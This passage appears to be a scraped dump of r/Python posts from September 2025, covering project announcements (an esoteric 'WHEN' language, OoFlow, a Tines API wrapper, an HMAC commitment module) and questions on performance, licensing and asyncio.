(I‚Äôve been tinkering with a little experiment in running full, latest **Sphinx completely in a browser** using WebAssembly ‚Äî will share it in the comments if anyone‚Äôs curious.)"
1nmuy7t,Python 3.13 is 10% slower than 3.12 for my file parser,Bubbly-Craft8736,396,74,2025-09-21 15:28:59,https://www.reddit.com/r/Python/comments/1nmuy7t/python_313_is_10_slower_than_312_for_my_file/,"I have written a custom parser for a game-specific file format. 

It performs particularly bad when there's too many nested references (A reference to a different object in an object), but that's a different problem on its own.

The current problem I have is with the performance degradation by almost 10% when using Python 3.13. I am trying to figure out what changes happened in 3.13 that might be relevant for my issue.

I should probably attach the concrete code, so [here](https://github.com/seifhassine/REasy/blob/d4d4c842511c51d52913e7d5d63e752875fa17ef/file_handlers/rsz/rsz_file.py#L2068) is the method in question."
1nmu5pn,senior junior talks,AdScary1945,0,3,2025-09-21 14:58:04,https://www.reddit.com/r/Python/comments/1nmu5pn/senior_junior_talks/,"[https://www.geeksforgeeks.org/courses/c-skill-up](https://www.geeksforgeeks.org/courses/c-skill-up)¬†hi i am a student of cybersecurity now i am first year i just wanna ask you is this course will help in academics to pass my pps (c language) exam

"
1nmta0f,I built a full programming language interpreter in Python based on a meme,HearMeOut-13,115,18,2025-09-21 14:22:42,https://www.reddit.com/r/Python/comments/1nmta0f/i_built_a_full_programming_language_interpreter/,"The project started as a joke based on the ""everyone talks about while loops but no one asks WHEN loops"" meme, but evolved into a complete interpreter demonstrating how different programming paradigms affect problem-solving approaches.

# What My Project Does

WHEN is a programming language interpreter written in Python where all code runs in implicit infinite loops and the only control flow primitive is `when` conditions. Instead of traditional for/while loops, everything is reactive:

    # WHEN code example
    count = 0
    
    main:
        count = count + 1
        print(""Count:"", count)
        when count >= 5:
            print(""Done!"")
            exit()

The interpreter features:

* Full lexer, parser, and AST implementation
* Support for importing Python modules directly
* Parallel and cooperative execution models
* Interactive graphics and game development capabilities (surprisingly)

You can install it via pip: `pip install when-lang`

# Target Audience

This is Currently a toy/educational project, but exploring use cases in game development, state machine modeling, and reactive system prototyping, currently exploring

* Learning about interpreter implementation
* Exploring state machine programming
* Educational purposes (understanding event-driven systems)
* Having fun with esoteric language design

NOT recommended for production use (everything is global scope and runs in infinite loops by design).

# Comparison

Unlike traditional languages:

* **No explicit loops** \- Everything runs implicitly forever until stopped
* **No if statements** \- Only `when` conditions that check every iteration
* **Forced reactive paradigm** \- All programs become state machines
* **Built-in parallelism** \- Blocks can run cooperatively or in parallel threads

Compared to other Python-based languages:

* **Brython/Skulpt**: Compile Python to JS, WHEN is a completely different syntax
* **Hy**: Lisp syntax for Python, WHEN uses reactive blocks instead
* **Coconut**: Functional programming, WHEN is purely reactive/imperative

The closest comparison might be reactive frameworks like RxPy, but WHEN makes reactive programming the ONLY way to write code, not an optional pattern.

# Implementation Details

The interpreter (\~1000 lines) includes:

* Custom lexer with indentation-based parsing
* Recursive descent parser generating an AST
* Tree-walking interpreter with parallel execution support
* Full Python module interoperability

Example of WHEN's unique block system:

    # Runs once
    os setup():
        initialize_system()
    
    # Runs exactly 5 times
    de heartbeat(5):
        print(""beat"")
    
    # Runs forever
    fo monitor():
        check_status()
    
    # Entry point (implicit infinite loop)
    main:
        when not_started:
            setup()
            heartbeat.start()
            monitor.start()

GitHub: [https://github.com/PhialsBasement/WHEN-Language](https://github.com/PhialsBasement/WHEN-Language)"
1nmq30k,Licensing Platform for Fintech Software Website Sync?,Greedy_Bookkeeper_30,0,3,2025-09-21 11:59:55,https://www.reddit.com/r/Python/comments/1nmq30k/licensing_platform_for_fintech_software_website/,"Disclaimer: I foolishly got GPT to write this post but it seems to nail down what I am looking for.

TL;DR

* Late-stage beta **Windows desktop trading app** (integrates with **MT5**).
* Need two things (ideally decoupled):
   1. **Pro desktop UI** (tabs for Live/Backtest/Config, logs, charts, settings, license status). Open to **PySide6/Qt, .NET, or Tauri/Electron**.
   2. **Licensing + accounts + payments** tied to **WordPress users** (trials, activations/deactivations, online check with offline grace, basic telemetry).
* Prefer a **packaged/licensing platform** \+ **subscription stack** that handles invoices/taxes (**Stripe+Woo**, **Paddle**, or **Lemon Squeezy**).
* Must stay a desktop app; want **auto-update, code signing, crash reporting** if possible.
* Looking for a **partner/contractor** or **battle-tested stack recommendations**. DM with examples, stack preference, and rough timeline.

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

I‚Äôm in late-stage beta on a trading project (Stirling FOREX). The core engine is solid and runs as a **Windows desktop app** that integrates with **MetaTrader 5** via API. The current UI is a functional ‚Äúbuilder‚Äù style interface, but it‚Äôs time to replace it with something professional‚Äîand, separately, I need to stand up the **licensing + accounts + payments** side. Ideally those two tracks don‚Äôt have to be tightly coupled.

**What I need (two parallel tracks):**

1. **UI replacement (desktop, Windows first)**

* Re-skin/replace the current builder UI with a clean, professional desktop UI.
* Keep it native-feeling and performant (I‚Äôm open on framework: PySide6/Qt, .NET wrapper, Tauri/Electron if justified, etc.).
* Typical screens: multi-tab layout (Live, Backtest, Config), tables/logs, charts, start/stop controls, settings, license/status panel.
* Nice to have: light/dark themes, responsive layout, error toasts, and a safe auto-update flow.

1. **Licensing + website accounts + payments (WordPress)**

* Users already have/will have **WordPress accounts** on my site.
* I want **licenses tied to website accounts** (plan-based, per-seat/per-machine), with:
   * trials, activations/deactivations,
   * online verification with a short offline grace window,
   * basic telemetry/heartbeat is fine if needed.
* **Payments & accounting:** looking for an off-the-shelf subscription stack that handles invoicing, taxes (Canada GST/HST), refunds, and proration.
   * I‚Äôm open to options like Stripe (+ WooCommerce/membership), Paddle, Lemon Squeezy, etc.‚Äîwhichever is the least painful and plays nicely with WordPress and a license server.
* Bonus: code signing for Windows builds, crash reporting, and a straightforward release pipeline.

**Key constraints & reality check**

* This **must remain a desktop app** (tight MT5 integration).
* I don‚Äôt have the bandwidth to build licensing/commerce from scratch. A **packaged platform or proven combo** is preferred.
* I‚Äôm aiming to **decouple** the UI rebuild from the licensing/commerce work so either can ship independently.

**What I bring**

* Fully working trading engine with clear boundaries between logic and UI.
* Test builds and sample data for quick iteration.
* Fast feedback cycles and a pragmatic scope (ship the essentials first).

**What I‚Äôm looking for**

* Either: (a) a **partner/contractor** who can take one or both tracks, or (b) **recommendations** for a licensing+commerce setup that fits a WordPress site and a Python/Windows desktop app.
* War stories welcome: gotchas with Paddle/Lemon Squeezy/Stripe+Woo, WordPress SSO flows into a desktop client, license server choices, updater tooling, and code signing tips.

If you‚Äôre interested (or have a battle-tested stack to recommend), please drop a comment or DM me with:

* Relevant examples (UI rebuilds, licensing integrations).
* Your preferred stack and why.
* Rough timeline/engagement model.



Me again. This isn't a time sensitive project. Just something I have been building for fun that actually turned into some violently complicated.

Cheers,

"
1nmo8hl,pyya - integrate YAML configurations with your code easily,wit4er,9,2,2025-09-21 10:12:02,https://www.reddit.com/r/Python/comments/1nmo8hl/pyya_integrate_yaml_configurations_with_your_code/,"Updated to v0.1.9. Added a CLI tool to generate stubs for YAML configuration, now attribute style configuration has nice completion suggestions assuming you have setup mypy/python LSP.

Install:
pip install pyya

Page:
https://github.com/shadowy-pycoder/pyya

Features:

1) Automatically merge default and production configuration files
2) Convert keys in configuration files to snake_case
3) YAML validation with Pydantic models
4) Generate stub files for your dynamic configuration with pyya CLI tool.
5) Simple API"
1nmio5b,duvc-ctl Windows library for UVC camera control and Property control,Ok_Avocado_5836,6,0,2025-09-21 04:30:25,https://www.reddit.com/r/Python/comments/1nmio5b/duvcctl_windows_library_for_uvc_camera_control/,"I made this for controlling USB cameras on Windows without needing any extra SDKs or serial controls for PTZ. It‚Äôs called duvc-ctl. Supports C++, Python(other languages support coming soon), and a CLI for adjusting pan/tilt/zoom(ptz), focus, exposure, and other camera properties.

https://github.com/allanhanan/duvc-ctl

What my project does:
Control camera properties such as Brightness, Exposure, Pan, Tilt, Zoom, and other camera properties available in DirectShow 
It exposes the DirectShow api to access these properties easily in C++ and binds it to python

Linux already has v4l2-ctl which is waay better but windows was lacking

Would be interested to hear if others find this useful or have ideas for where it could fit into workflows.

I personally found this useful where I didn't want to mess with visca or other serial protocols and just wanted to control it from python with just the usb connected

I might add linux support but I'm open to hear any opinions on this for now "
1nmgr3q,super lightweight stateful flow,Significant-Maize933,27,0,2025-09-21 02:45:39,https://www.reddit.com/r/Python/comments/1nmgr3q/super_lightweight_stateful_flow/,"**What My Project Does**

A lightweight AI-Ready Python framework for building asynchronous data processing pipelines with stateful nodes.

**Target Audience**

Those who wants to build AI application backends or lightweight data process backends. The project is not massivly tested in production.

**Comparison**

Compared to hamilton, airflow, pydag, etc., OoFlow is super lightweight and has very easy to use APIs, no restrictions on code positions, and its nodes/tasks are stateful, enabling cross-messages business logic.

\----------------------------------------------

when i was building new applications(some were AI related), i found the programming paradigm changed, because the first token/byte of  each phase deeply affect user experiences.

i had to make every step processing data asynchronous, stateful, parallel.

    """"""
    Flow topology diagram:
        A
        ‚îÇ
        ‚ñº
        B
       ‚ï± ‚ï≤
      ‚ñº   ‚ñº
      C   D
       ‚ï≤ ‚ï±
        ‚ñº
        E
    """"""
    flow = ooflow.create(
        A.to(B),           # A ‚Üí B
        B.to(C, D),        # B ‚Üí C, D (branching)
        C.to(E),           # C ‚Üí E
        D.to(E)            # D ‚Üí E (merging)
    )

i tried many frameworks(say hamilton, airflow, pydag, pipefunc ...), and finally decided to build a new one, they are either **too heavy, or have some weird rules to follow, or can not make my task function stateful**.

that's why i built OoFlow, you can realize the above graph/tasks-chain like this:

    import asyncio
    import ooflow
    
    u/ooflow.Node
    async def A(context: ooflow.Context):
        while True:
            msg = await context.fetch()
            await context.emit(f""{msg} A | "")
    
    u/ooflow.Node
    async def B(context: ooflow.Context):
        while True:
            msg = await context.fetch()
            await context.emit(f""{msg} B | "", C)
            await context.emit(f""{msg} B | "", D)
    
            # # you can also emit to C, D all at once
            # await context.emit(f""{msg} B | "")
    
    u/ooflow.Node
    async def C(context: ooflow.Context):
        while True:
            msg = await context.fetch()
            await context.emit(f""{msg} C | "")
    
    @ooflow.Node
    async def D(context: ooflow.Context):
        while True:
            msg = await context.fetch()
            await context.emit(f""{msg} D | "")
    
    @ooflow.Node
    async def E(context: ooflow.Context):
        while True:
            msg_from_C = await context.fetch(C)
            msg_from_D = await context.fetch(D)
            await context.emit(f""{msg_from_C} E"")
            await context.emit(f""{msg_from_D} E"")
    
            # # you can also fetch from C, D in one line
            # msg = await context.fetch()
            # await context.emit(f""{msg} E"")
    
    async def main():
        flow = ooflow.create(
            A.to(B),
            B.to(C, D), 
            C.to(E),
            D.to(E)
        )   
        flow.run()
    
        async def producer():
            count = 0 
            while True:
                count = count + 1 
                await flow.emit(f""{count}"")
                await asyncio.sleep(1)
    
        asyncio.create_task(producer()),
        while True:
            print(await flow.fetch())
    
    if __name__ == ""__main__"":
        asyncio.run(main())

the very important point of OoFlow is: task nodes are **stateful**. meaning that your task function will not exit after processing one message, you can leverage this feature to build cross-message functionalities, which are very common in AI-apps building.

and OoFlow supports cyclic graph and multiple graphs in one flow instance, non-blocking fetches/emits are also supported, and class/instance/static methods are also supported.

the project site is: [https://github.com/fanfank/ooflow](https://github.com/fanfank/ooflow) it would be great if this framework helps you, and give your star :D"
1nmdhrp,Sunday Daily Thread: What's everyone working on this week?,AutoModerator,8,11,2025-09-21 00:00:32,https://www.reddit.com/r/Python/comments/1nmdhrp/sunday_daily_thread_whats_everyone_working_on/,"# Weekly Thread: What's Everyone Working On This Week? üõ†Ô∏è

Hello /r/Python! It's time to share what you've been working on! Whether it's a work-in-progress, a completed masterpiece, or just a rough idea, let us know what you're up to!

## How it Works:

1. **Show & Tell**: Share your current projects, completed works, or future ideas.
2. **Discuss**: Get feedback, find collaborators, or just chat about your project.
3. **Inspire**: Your project might inspire someone else, just as you might get inspired here.

## Guidelines:

* Feel free to include as many details as you'd like. Code snippets, screenshots, and links are all welcome.
* Whether it's your job, your hobby, or your passion project, all Python-related work is welcome here.

## Example Shares:

1. **Machine Learning Model**: Working on a ML model to predict stock prices. Just cracked a 90% accuracy rate!
2. **Web Scraping**: Built a script to scrape and analyze news articles. It's helped me understand media bias better.
3. **Automation**: Automated my home lighting with Python and Raspberry Pi. My life has never been easier!

Let's build and grow together! Share your journey and learn from others. Happy coding! üåü"
1nm3in3,DBMS based on python dictionarys,Friendly_Nothing_546,0,15,2025-09-20 17:01:36,https://www.reddit.com/r/Python/comments/1nm3in3/dbms_based_on_python_dictionarys/,"Hello, I'm a programming student and enthusiast, and I'm here to launch a DBMS called datadictpy that uses Python dictionary logic to store data.

 # What my project does:

 Creates tables, relates data, saves data, changes data, and deletes data, using dictionaries as a structured data storage method.

# Some functions

``add_element(""nome"")``

This method creates a table/list, it is called after adding data in the standard python way to a dictionary, for the dictionary to be considered it is necessary to make it an object of the dB class

``find_key_element(""Key"", ""list"")``

This method finds all elements of a table that share the same dictionary key like ""name"" for example

``find_value_element(""Key"", ""value"", ""lista)``

This method checks if a value exists within the table.

``show_list(""list"")``

This method displays an entire table in the terminal.

``find_id(""id"", ""list"")``

This method finds data related to an ID within a list.

These are some functions; in general, the system uses standard Python dictionary syntax.

# Target Audience
 It's a production project, but it's in its early stages and needs a bit more refinement. However, it works perfectly with frameworks.

# Comparison
 This project differs from DBMSs like MySQL, PostgreSQL, etc., because it uses dictionaries as a structured data format and does not require an ORM..

# How it contributes
 This project can contribute to Python by reducing dependence on APIs like MySQL in certain projects, as it would be done by Python itself.

https://github.com/Heitor2025/datadictpy.git

Good coding for everyone"
1nm04o4,Cosmic Django: Architecture Patterns,poopatroopa3,8,1,2025-09-20 14:48:16,https://www.reddit.com/r/Python/comments/1nm04o4/cosmic_django_architecture_patterns/,"https://brunodantas.github.io/blog/2025/09/12/cosmic-django/

Article on the applicability of the patterns from the Cosmic Python book (Architecture Patterns With Python) to Django projects.
"
1nlze8r,Tines API Wrapper,XDoomdieX,23,14,2025-09-20 14:18:42,https://www.reddit.com/r/Python/comments/1nlze8r/tines_api_wrapper/,"**Links**

PyPI: [https://pypi.org/project/Tapi/](https://pypi.org/project/Tapi/)  
GitHub: [https://github.com/1Doomdie1/Tapi](https://github.com/1Doomdie1/Tapi)  
Pepy.tech: [stats](https://pepy.tech/projects/tapi?timeRange=threeMonths&category=version&includeCIDownloads=true&granularity=daily&viewType=line&versions=0.1.3%2C0.1.2)

**So what is Tines?**

In short, **Tines** is a no-code automation platform designed for security and IT teams. It allows users to build, orchestrate, and automate workflows such as incident response, threat detection, and IT operations without needing to write code. By connecting to APIs and tools, Tines helps streamline repetitive tasks, reduce response times, and improve operational efficiency. Althought it is marketed as a ""*no-code*"" solution, that doesn't mean it doesn't have the ability to run code. Quite the opposite, it provides you with a dedicated action which allows you to write and execute your own python code.

**What My Project Does**

I created **Tapi** as a Python wrapper for the [Tines API](https://www.tines.com/api/welcome/). Rather than dealing with raw HTTP requests or parsing JSON by hand, Tapi provides structured classes like `WorkflowsAPI`, `ActionsAPI`, `CredentialsAPI`, and others. These give you a clean way to interact with your Tines tenant and its endpoints.

**Examples**

Pulling information about your tenant would look somehting like this:

    from json import dumps
    from tapi import TenantAPI
    
    def main():
        DOMAIN  = ""my-cool-domain-1234""
        API_KEY = ""do_not_put_this_on_github_lol""
        
        tenant = TenantAPI(DOMAIN, API_KEY)
        
        tenant_info = tenant.info()
        
        print(dumps(tenant_info, indent = 4))

Output:

    {
        ""body"": {
            ""stack"": {...}
        },
        ""headers"": {...},
        ""status_code"": ...
    }

Another example would be getting all the workflows from your tenant.

    from json import dumps
    from tapi import StoriesAPI
    
    def main():
        DOMAIN  = ""my-cool-domain-1234""
        API_KEY = ""do_not_put_this_on_github_lol""
        
        stories_api = StoriesAPI(DOMAIN, API_KEY)
        
        stories = stories_api.list()
        
        print(dumps(stories, indent = 4))

Output:

    {
        ""body"": {
            ""stories"": [
                {
                    ""name"": ""Testing"",
                    ""user_id"": 1234,
                    ""description"": null,
                    ""keep_events_for"": 604800,
                    ""disabled"": false,
                    ""priority"": false
                    //...[snip]...//
                }
            //...[snip]...//
            ]
        },
        ""headers"": {...},
        ""status_code"": ...
    }

And so on and so forth. To find out more, please do check out the GitHub or PyPI repos.

I‚Äôd love to hear what you think! Feedback, feature requests, or contributions are always welcome!"
1nlwpe8,Fake OS - Worth making?,BravestCheetah,0,21,2025-09-20 12:18:48,https://www.reddit.com/r/Python/comments/1nlwpe8/fake_os_worth_making/,"So, a while ago i discovered this repo on github: [https://github.com/crcollins/pyOS](https://github.com/crcollins/pyOS)

In summary, its a program trying to simulate an OS by having a kernel, programs (terminal commands), a filesystem etc.

Ive been impressed of the dedication for something that isnt useful in your everyday life. Though ive seen the small group of repositories making similar projects fascinating, and thought about making my own, but ive yet to come up a reason for it.

So here i am, wanting to ask:

Is something like this worth making, following the structure of a real computer, containing a kernel, drivers, the OS layer, BIOS etc?

What would be ways to make it useful / more interesting?

All feedback is appreciated, thanks in advance :O"
1nlwdh0,Idea for Open Source package,Goldziher,0,6,2025-09-20 12:02:03,https://www.reddit.com/r/Python/comments/1nlwdh0/idea_for_open_source_package/,"Hi all, I have a use for a proper Python equivalent to `knip`. Knip is a TypeScript/JavaScript package that performs complex dead code analysis. It's fast and pretty reliable - despite the huge complexities involved with the JS ecosystem. I don't know anything similar in Python. The best dead code analyzer I know is proprietary and is part of the IntelliJ Python plugin / PyCharm. 

So, in a nutshell, it would be awesome if someone here decides to create this. In today age it should be written in Rust.
"
1nlw9dz,"it's not always about django vs fastapi/flask, you can use both",lutian,7,16,2025-09-20 11:56:18,https://www.reddit.com/r/Python/comments/1nlw9dz/its_not_always_about_django_vs_fastapiflask_you/,"I've build an intricate image generation tool and, while I started with django (I have a svelte+django template I use for all my projects), I slowly started to extract certain parts of it, most relevant one is the ""engine"". here's an overview:

\- backend: django, django-allauth, django-drf, celery workers, celery beat, sqlite (WAL mode for speed), etc.  
\- engine (where the magic happens): fastapi with sqlalchemy (still with sqlite w/ WAL)  
\- frontend: svelte static site, server via nginx under docker  
\- metabase (analytics): reads my sqlite from django and provides nice graphs

backend handles all the requests and crud, while engine actually does what users want. the reason I separated them is that now I can have multiple engine instances, nicely orchestrated by django (I don't have that yet, and it'll take some time as I can just beef up my vps until huge scale hits me, but still it's good to have).

I'm still very fond of using python instead of node (I'm not a js dev). you have so many ai/ml/charting libs in python, and can prototype really fast directly in django, like running some kind of expensive ml task dierectly as part of the processing of the request, just to test things out, but of course you can then defer them to celery workers, and when you need more power just ad more celery workers. you can sustain pretty high loads this way, also use gunicorn with uvicorn worker type for even better process management

all these under a single docker compose on my hetzner vps"
1nlvv14,"Pure Python Cryptographic Commitment Scheme: General Purpose, Offline-Capable, Zero Dependencies",Difficult_Jicama_759,0,39,2025-09-20 11:35:28,https://www.reddit.com/r/Python/comments/1nlvv14/pure_python_cryptographic_commitment_scheme/,"Hello everyone, I have created a cryptographic commitment scheme that is universally applicable to any computer running python, it provides cryptographic security to any average coder just by copy and pasting the code module I curated below, it has many use cases and has never been available/accessible until now according to GPT deep search. My original intent was to create a verifiable psi experiment, then it turned into a universally applicable cryptographic commitment module code that can be used and applied by anyone at this second from the GitHub repository.

Lmk what ya‚Äôll think?

ChatGPT‚Äôs description: This post introduces a minimal cryptographic commitment scheme written in pure Python. It relies exclusively on the Python standard library. No frameworks, packages, or external dependencies are required. The design goal was to make secure commitment‚Äìreveal verification universally usable, auditably simple, and deployable on any system that runs Python.

The module uses HMAC-SHA256 with domain separation and random per-instance keys. The resulting commitment string can later be verified against a revealed key and message, enabling proof-of-prior-knowledge, tamper-evident disclosures, and anonymous timestamping.

‚∏ª

Repositories:

‚Ä¢	Minimal module: https://github.com/RayanOgh/Minimal-HMAC-SHA256-Commitment-Verification-Skeleton-Python-

‚Ä¢	Extended module with logging/timestamping: https://github.com/RayanOgh/Remote-viewing-commitment-scheme

‚∏ª

Core Capabilities: ‚Ä¢	HMAC-SHA256 cryptographic commitment

‚Ä¢	Domain separation using a contextual prefix

‚Ä¢	32-byte key generation using os.urandom

‚Ä¢	Deterministic, tamper-evident output

‚Ä¢	Constant-time comparison via hmac.compare_digest

‚Ä¢	Canonicalization option for message normalization

‚Ä¢	Fully offline operation

‚Ä¢	Executable in restricted environments

‚∏ª

Applications:

1.	‚Å†Scientific Pre-Registration ‚Ä¢	Commit to experimental hypotheses or outputs before public release
2.	‚Å†Anonymous Proof-of-Authorship ‚Ä¢	Time-lock or hash-lock messages without revealing them until desired
3.	‚Å†Decentralized Accountability ‚Ä¢	Enable individuals or groups to prove intent, statements, or evidence at a later time
4.	‚Å†Censorship Resistance ‚Ä¢	Content sealed offline can be later verified despite network interference
5.	‚Å†Digital Self-Testimony ‚Ä¢	Individuals can seal claims about future events, actions, or beliefs for later validation
6.	‚Å†Secure Collaborative Coordination ‚Ä¢	Prevent cheating in decision processes that require asynchronous commitment and later reveal
7.	‚Å†Education in Applied Cryptography ‚Ä¢	Teaches secure commitment schemes with no prerequisite tooling
8.	‚Å†Blockchain-Adjacent Use ‚Ä¢	Works as an off-chain oracle verification mechanism or as a pre-commitment protocol

‚∏ª

Design Philosophy:

The code does not represent innovation in algorithm design. It is a structural innovation in distribution, accessibility, and real-world usability. It converts high-trust commitment protocols into direct, deployable, offline-usable infrastructure. All functionality is transparent and auditable. Because it avoids dependency on complex libraries or hosted backends, it is portable across both privileged and under-resourced environments.

‚∏ª

Conclusion:

This module allows anyone to generate cryptographic proofs of statements, events, or data without needing a company, a blockchain, or a third-party platform. The source code is auditable, adaptable, and already functioning. It is general-purpose digital infrastructure for public verifiability and personal integrity.

Use cases are active. Implementation is immediate. The code is already working."
1nlux1e,What should I do to start earning fast ?,Red_Priest0,0,21,2025-09-20 10:42:28,https://www.reddit.com/r/Python/comments/1nlux1e/what_should_i_do_to_start_earning_fast/,I am currently on loop on python and I feeling I want money from python as Soon as possible as a freelancer what should I learn by using python that I can start earning money 
1nltf58,"Scintilla, Qt and alternative text editor widgets",ThylowZ,8,13,2025-09-20 09:10:44,https://www.reddit.com/r/Python/comments/1nltf58/scintilla_qt_and_alternative_text_editor_widgets/,"Hello fellow python enjoyers,

I'm currently considering moving away from PyQt6 to go on PySide6 due to license issues. However, it would imply moving away from QScintilla as a text editor too, since there is no bindings for Scintilla on PySide side.

I don't want to go back to ""default"" QPlainTextEdit since my needs are close to the ones of a Source Code editor (especially indentation guides).

Do any of you know an alternative? I'm leaning towards Monaco via [QTMonaco](https://github.com/bec-project/qtmonaco), but there might be better options or easier to adapt (I still need to find out resources regarding Monaco)."
1nlqcrz,Weird event loop/closure error?,kmmbvnr,2,2,2025-09-20 05:59:11,https://www.reddit.com/r/Python/comments/1nlqcrz/weird_event_loopclosure_error/,"Could someone explain me what cause the second `async_to_sync` call to fail and more interestingly why the hack to overcome the error works?

I'm using the `taskiq` library from synchronous function, so instead of `await async_job.kiq(""name"")`, I'm using `async_to_sync`. The first call succeeds, but the second one fails miserably

    RuntimeError: Task <Task pending name='Task-4' coro=<AsyncToSync.__call__.<locals>.new_loop_wrap() running at /home/kmmbvnr/Workspace/summary/.venv/lib/python3.12/site-packages/asgiref/sync.py:230> cb=[_run_until_complete_cb() at /usr/lib/python3.12/asyncio/base_events.py:182]> got Future <Future pending> attached to a different loop

Surprisingly the simple hack to wrap it in sync\_to\_async and back helps

    if __name__ == ""__main__"":
        # this two calls works fine
        # async_to_sync(sync_to_async(lambda: async_to_sync(async_job.kiq)(""first"")))
        # async_to_sync(sync_to_async(lambda: async_to_sync(async_job.kiq)(""second"")))
    
    
        # more straigtforward approach produce an error on second call
        print(""first"")
        async_to_sync(async_job.kiq)(""first"")
        print(""second"")
        async_to_sync(async_job.kiq)(""second"") # fails

Full gist - [https://gist.github.com/kmmbvnr/f47c17ed95a5a6dc0a166ed7e75c0439](https://gist.github.com/kmmbvnr/f47c17ed95a5a6dc0a166ed7e75c0439)"
1nllur9,Why isn't the copy() method part of the Sequence and MutableSequence ABCs?,jpgoldberg,45,27,2025-09-20 01:55:01,https://www.reddit.com/r/Python/comments/1nllur9/why_isnt_the_copy_method_part_of_the_sequence_and/,"The `Sequence` ABC from collections.abc does not include an abstract method copy(). What are the reasons for that design choice?

Note that I am *not* asking how to work with that design choice. Instead I am trying to understand it.

## Update

There have been great comments helping to answer (or even unask) the question. What I found most compelling is the observation (that I needed pointed out to me) that `copy` is problematic for a number reasons.

People drew attention to this discussion of adding copy to `Set`:

https://bugs.python.org/issue22101

### copy return type

There are two arguments against adding copy to Set. One is that depending on the backing of the data copy might be inappropriate. The other is that the return type of copy is unclear. As Guido says, 

> I personally despise almost all uses of ""copying"" (including the entire copy module, both deep and shallow copy functionality).  I much prefer to write e.g. list(x) over x.copy() -- when I say list(x) I know the type of the result.

I had not thought of that before, but once stated, I completely agree with it.
I am no longer thinking about creating a `CopiableSequence` protocol. If I have a concrete class for which `copy` makes sense and has clear semantics, I might add concrete a concrete method, but even then, I would probably probably create something like

```python
MyConcreteSequence[T](Sequence[T]):
   def mutable_copy(self) -> list[T]:
      ...  # actual implementation would go here.
```

but I don't really foresee needing to do that.

### Keep the ""Base"" in ABC

The other line of answer was effectively about how basic a base class is expected to be. These really should be the minimal description of what makes something conform to the ABC. I find that a good and principled argument, but then I am left with why `reversed()` is included in `Sequence`.

So I come back to thinking that the relevant difference between `reversed()` and `copy()` for an immutable thing like Sequence is about deciding what the return type of `copy()` should be.

#### Update (again)

My initial sense that implementing `copy` would depend on the same underlying properties of the data in the same way that implementing `reversed` would was mistaken. I learned a great deal in the discussion, and I encourage others to read it.


"
1nljibj,Saturday Daily Thread: Resource Request and Sharing! Daily Thread,AutoModerator,3,1,2025-09-20 00:00:30,https://www.reddit.com/r/Python/comments/1nljibj/saturday_daily_thread_resource_request_and/,"# Weekly Thread: Resource Request and Sharing üìö

Stumbled upon a useful Python resource? Or are you looking for a guide on a specific topic? Welcome to the Resource Request and Sharing thread!

## How it Works:

1. **Request**: Can't find a resource on a particular topic? Ask here!
2. **Share**: Found something useful? Share it with the community.
3. **Review**: Give or get opinions on Python resources you've used.

## Guidelines:

* Please include the type of resource (e.g., book, video, article) and the topic.
* Always be respectful when reviewing someone else's shared resource.

## Example Shares:

1. **Book**: [""Fluent Python""](https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008) \- Great for understanding Pythonic idioms.
2. **Video**: [Python Data Structures](https://www.youtube.com/watch?v=pkYVOmU3MgA) \- Excellent overview of Python's built-in data structures.
3. **Article**: [Understanding Python Decorators](https://realpython.com/primer-on-python-decorators/) \- A deep dive into decorators.

## Example Requests:

1. **Looking for**: Video tutorials on web scraping with Python.
2. **Need**: Book recommendations for Python machine learning.

Share the knowledge, enrich the community. Happy learning! üåü"
1nld9qx,Python Context Managers 101,SeleniumBase,11,22,2025-09-19 19:38:14,https://www.reddit.com/r/Python/comments/1nld9qx/python_context_managers_101/,"You've likely seen it before: The `with` keyword, which is one way of using Python context managers, such as in this File I/O example below:

```python
with open('my_file.txt', 'r') as f:
    content = f.read()
    print(content)
```

Python context managers provide a way to wrap code blocks with setUp and tearDown code that runs before and after the code block. This tearDown part can be useful for multiple reasons, such as freeing up resources that have been allocated, closing files that are no longer being read from (or written to), and even quitting browsers that were spun up for automated testing.

Creating them is simple. Let's create a simple context manager that displays the runtime of a code block:

```python
import time
from contextlib import contextmanager

@contextmanager
def print_runtime(description=""Code block""):
    start_time = time.time()
    try:
        yield
    finally:
        runtime = time.time() - start_time
        print(f""{description} ran for {runtime:.4f}s."")
```

Here's how you could use it as a method decorator:

```python
@print_runtime()
def my_function():
    # <CODE BLOCK>

my_function()
```

Here's how you could use it within a function using the `with` keyword:

```python
with print_runtime():
    # <CODE BLOCK>
```

And here's a low-level way to use it without the `with` keyword:

```python
my_context = print_runtime()
my_object = my_context.__enter__()
# <CODE BLOCK>
my_context.__exit__(None, None, None)
```

As you can see, it's easy to create and use Python context managers. You can even pass args into them when configured for that. In advanced scenarios, you might even use context managers for browser automation. Example:

```python
from seleniumbase import SB

with SB(incognito=True, demo=True, test=True) as sb:
    sb.open(""https://www.saucedemo.com"")
    sb.type(""#user-name"", ""standard_user"")
    sb.type(""#password"", ""secret_sauce"")
    sb.click(""#login-button"")
    sb.click('button[name*=""backpack""]')
    sb.click(""#shopping_cart_container a"")
    sb.assert_text(""Backpack"", ""div.cart_item"")
```

That was a simple example of testing an e-commerce site. There were a few args passed into the context manager on initialization, such as `incognito` for Chrome's Incognito Mode, `demo` to highlight browser actions, and `test` to display additional info for testing, such as runtime.

Whether you're looking to do simple File I/O, or more advanced things such as browser automation, Python context managers can be extremely useful!"
1nlaq8e,"What do you need to know to make a simple text adventure game, or just a text game in Python ???",SkyDwag187,0,23,2025-09-19 18:01:04,https://www.reddit.com/r/Python/comments/1nlaq8e/what_do_you_need_to_know_to_make_a_simple_text/,"THE MODERATORS SAID MY BODY TEXT NEEDS TO BE AT LEAST 120 CHARACTERS LONG. I DON'T KNOW WHY IT SAYS IT'S OPTIONAL SO I,M WRITING THIS."
1nlaekl,I have a very important question.,One_Ranger_5979,0,6,2025-09-19 17:48:43,https://www.reddit.com/r/Python/comments/1nlaekl/i_have_a_very_important_question/,"I was looking to get in python application development, but I need a clear and easy roadmap,  
For my frontend i chose PyQt6 and Tkinter, but now im confused, what do i learn for the backend, for file management i chose OS but for dashboards, graphs, etc. (libraries to make proper applications)"
1nl9tk6,BleScope - Like a telescope for Bluetooth Low energy devices üî≠,lion_24,2,0,2025-09-19 17:27:06,https://www.reddit.com/r/Python/comments/1nl9tk6/blescope_like_a_telescope_for_bluetooth_low/,"Hello reddit,

